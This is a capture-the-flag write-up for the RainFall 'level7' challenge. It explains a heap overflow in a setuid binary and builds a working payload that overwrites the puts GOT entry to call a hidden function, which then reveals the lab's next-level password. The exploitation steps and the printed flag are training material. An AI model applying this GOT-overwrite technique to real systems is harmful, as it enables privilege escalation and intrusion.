level7
======

*	We spawn with a [level7](source/level7) executable
	```console
	level7@RainFall:~$ ls -l 
	total 8
	-rwsr-s---+ 1 level8 users 5648 Mar  9  2016 level7
	level7@RainFall:~$ ./level7 
	Segmentation fault (core dumped)
	level7@RainFall:~$ ./level7 test
	Segmentation fault (core dumped)
	level7@RainFall:~$ ./level7 test test
	~~
	level7@RainFall:~$ 
	```
*	Let's look at the [code](source/level7.c) (I changed the name of some variable for the sake of my mental health):
	-	`main()` takes two arguments and then:
		-	two array and one normal var:
			-	`arr1` and `arr2` are both `malloc(8)`
			-	`varx` also `malloc(8)` to create a seperated memory region
			-	it should look something like this:
				```c
				arr1[0] = 1
				arr1[1] = [][][][][][][][] // 8 bytes memory region to store the string argv[1]

				arr2[0] = 2
				arr2[1] = [][][][][][][][] // 8 bytes memory region to store the string argv[2]
				```
				To be fair the issue in this level7 is just understanding that horrible code
		-	next we have two `strcpy()`, one for each argument like shown above
		-	then `fopen()` and `fgets` respectively fetch and store the password of the next level in a global variable `c`
		-	and `puts("~~")`
	-	`m()` prints the content of `c` but is never called in `main()`
*	Pretty obvious here that we need to find a way to call `m()` but only once the password has been fetched onto `c`. As we did in the last level, we will strcpy. Most logical way to our means would be to replace the function pointer calling `puts()` to point to `m()`.
*	To reach `puts()`, we have to :
	-	overflow `arr1[1](argv[1])`
	-	to reach `arr2[0]`
	-	to reach `arr[1](argv[2])`
*	Once again let's use `ltrace` to retrieve every address
	```console
	level7@RainFall:~$ ltrace ./level7 
	[...]
	malloc(8)           = 0x0804a008 -> arr1
	malloc(8)           = 0x0804a018 -> varx
	malloc(8)           = 0x0804a028 -> arr2
	malloc(8)           = 0x0804a038 -> varx
	```
	Once again we can see that the allocation are contiguous.\
	We also find the difference between the two array is `a028 - a008 = 10(HEX) -> 16 bytes + 4 bytes to reach the second index -> 20 bytes`
*	Next step, find `puts()` int GOT:
	```gdb
	(gdb) x puts
	0x8048400 <puts@plt>:   0x992825ff
	(gdb) disas 0x8048400
	Dump of assembler code for function puts@plt:
	0x08048400 <+0>:     jmp    *0x8049928
	0x08048406 <+6>:     push   $0x28
	0x0804840b <+11>:    jmp    0x80483a0
	```
	`jmp` done at `\x28\x99\x04\x08`
*	Now for `m`:
	```
	(gdb) x m
	0x80484f4 <m>:  0x83e58955
	```
	we get this `\xf4\x84\x04\x08`
*	We have everything we need, let's build our payload:
	```console
	level7@RainFall:~$ ./level7 $(python -c 'print "a"*20 + "\x28\x99\x04\x08"') $(python -c 'print "\xf4\x84\x04\x08"')
	5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
	```
	padding + `puts()` & `m()`